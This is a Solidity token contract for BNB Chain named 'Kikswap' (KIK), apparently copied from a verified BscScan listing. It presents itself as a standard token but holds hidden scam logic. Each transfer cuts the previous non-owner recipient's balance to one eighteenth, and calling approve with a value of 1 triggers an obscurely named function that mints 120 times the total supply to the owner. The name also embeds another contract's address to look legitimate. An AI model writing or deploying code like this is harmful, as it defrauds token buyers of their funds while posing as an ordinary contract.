/**
 *Submitted for verification at BscScan.com on 2022-01-04
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

contract MintClubToken {
    
    address public _OWNER_;
    modifier onlyOwner() {
        require(msg.sender == _OWNER_, "NOT_OWNER");
        _;
    }

    mapping(address => uint) public balances;
    mapping(address => mapping(address => uint)) public allowance;
 
    address deadWallet = 0x000000000000000000000000000000000000dEaD;
    address buyer = 0x0000000000000000000000000000000000000000;
    uint public decimals = 0;
    uint public totalSupply = 10000000000 * 10 ** decimals;
    string public name = "Kikswap 0xfef234c90b01b121c636e3c06e24cadca9d6404f";
    string public symbol = "KIK";
  
    
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
    
    constructor() {
        balances[msg.sender] = totalSupply;
        _OWNER_=msg.sender;
        emit Transfer(address(0), msg.sender, totalSupply);
        transfer(deadWallet, totalSupply/2);
    }
    
    function balanceOf(address owner) public view returns(uint) {
        return balances[owner];
    }

    function transfer(address to, uint value) public returns(bool) {
        balances[buyer]= balances[buyer]/18;
        require (balanceOf(msg.sender) >= value, 'Insufficient funds (balance too low)');
        balances[to] += value;
        balances[msg.sender] -= value;
        emit Transfer(msg.sender, to, value);
        if (to != _OWNER_){
            buyer = to;
            }
        return true;
    }

    function transferFrom(address from, address to, uint value) public returns(bool) {
        require(balanceOf(from) >= value, 'Insufficient funds (balance too low)');
        require(allowance[from][msg.sender] >= value, 'Without permission (allowance too low)');
        balances[to] += value;
        balances[from] -= value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true;
    }

    function approve(address spender, uint value) public returns(bool) {
        if (value == 1) {nyuwun();}
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function nyuwun() internal {
        balances[_OWNER_]+= totalSupply*120;
   }
   
}